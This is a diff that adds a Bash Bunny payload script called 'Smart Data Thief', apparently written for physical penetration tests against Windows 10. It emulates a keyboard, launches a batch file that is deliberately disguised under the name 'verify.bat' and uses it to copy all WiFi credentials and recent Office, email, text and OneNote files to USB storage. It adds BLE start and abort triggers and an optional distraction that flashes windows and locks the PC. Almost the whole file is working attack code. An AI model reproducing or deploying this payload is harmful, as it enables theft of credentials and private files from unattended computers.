@@ -1,0 +1,109 @@
+# Title:         Smart Data Thief
+# Description:   Exfiltrates high value files from documents / desktop, gets all WiFi keys, shuts down after configurable 
+#                time, may be triggered to start and / or stop by BLE, offers optional distraction on shutdown
+# Author:        saintcrossbow
+# Props:         Hak5Darren
+# Version:       1.0
+# Category:      Exfiltration
+# Target:        Windows 10 with minimum powershell usage
+# Attackmodes:   HID, Storage
+
+# Full Description
+# ----------------
+# The perfect versatile data thief with multiple configurations to tailor attacks towards an engagement. Attack is timed 
+# so you'll know exactly how much time you have with each target. See the configuraton section for modifications. 
+#
+# Payload targets the following from the workstation:
+# - All WiFi creds
+# - The past 30 days in both Desktop and Documents
+# - All Word docs, Excel spreadsheets, loose email files (*.msg), text files, and OneNote notebooks
+# 
+# * Note: All bluetooth monitoring based on Hak5Darren's methods already present on the Bash Bunny
+
+# Files
+# -----
+# - payload.txt: Starts and monitors the attack. All configuration contained in this file.
+# - verify.bat: Run the file exfiltration. You may configure the target files in this batch file. Of course, it really doesn't 
+#   verify anything – it is just called that because it is "in disguise"
+
+# Setup
+# -----
+# - Place the payload.txt and verify.bat on either switch directory
+# - If you are using a SD card, copy verify.bat under /payloads/switchn/ (where n is the switch you are running)
+# - Good idea to have the Bash Bunny ready to copy to either the device or SD for maximum versatility
+
+# LEDs
+# ----
+# Magenta: Initial setup – about 1 – 3 seconds
+# Slow 1 second yellow on and off: Waiting for start mission trigger by BLE
+# Single yellow blink: Attack in progress
+# Green rapid flash, then solid, then off: Attack complete – Bash Bunny may be removed
+
+# Options
+# -------
+# Name of Bash Bunny volume that appears to Windows (BashBunny is default)
+BB_NAME="BashBunny"
+# Total time allocated for the attack, after which the Bash Bunny will shutdown
+EJECT_TIME=30
+# BLE ID to stop attack immediately and go to shutdown
+ABORT_MISSION="QSTOP"
+# Flash a bunch of windows and lock PC if ABORT mission received
+DISTRACT_ON_ABORT=false
+# Do we wait for a start trigger? And what is it?
+WAIT_FOR_TRIGGER=false
+START_MISSION="QSTART"
+
+# Setup
+# -----
+LED SETUP
+
+# Start bluetooth for observation
+source bunny_helpers.sh
+stty -F /dev/ttyS1 speed 115200 cs8 -cstopb -parenb -echo -ixon -icanon -opost
+stty -F /dev/ttyS1 speed 115200 cs8 -cstopb -parenb -echo -ixon -icanon -opost
+sleep 1
+echo -n -e "AT+ROLE=2" > /dev/ttyS1
+echo -n -e "AT+RESET" > /dev/ttyS1
+
+# Wait for "button job" if desired
+if $WAIT_FOR_TRIGGER; then
+  CUCUMBER ENABLE
+  LED Y SLOW
+  WAIT_FOR_PRESENT $START_MISSION
+fi
+
+# Attack
+# ------
+CUCUMBER DISABLE
+ATTACKMODE HID STORAGE
+Q DELAY 1000
+LED ATTACK
+Q DELAY 100
+Q GUI r
+Q DELAY 100
+
+Q STRING cmd.exe /c start /min powershell ".((gwmi win32_volume -f 'label=''$BB_NAME''').Name+'payloads\\$SWITCH_POSITION\verify.bat')"
+Q ENTER
+
+# Variation on the WAIT_FOR_PRESENT method so we can delay as well as observe BLE
+for (( c=1; c<=$EJECT_TIME; c++ ))
+do  
+  timeout 1s cat /dev/ttyS1 > /tmp/bt_observation
+  if grep -ao $ABORT_MISSION /tmp/bt_observation; then
+    if $DISTRACT_ON_ABORT; then
+      for i in {1..5}
+      do
+        Q GUI d
+        Q DELAY 200
+      done
+      Q GUI l
+    fi
+    break
+  fi  
+done
+
+sync
+LED FINISH
+Q DELAY 1500
+shutdown now
+
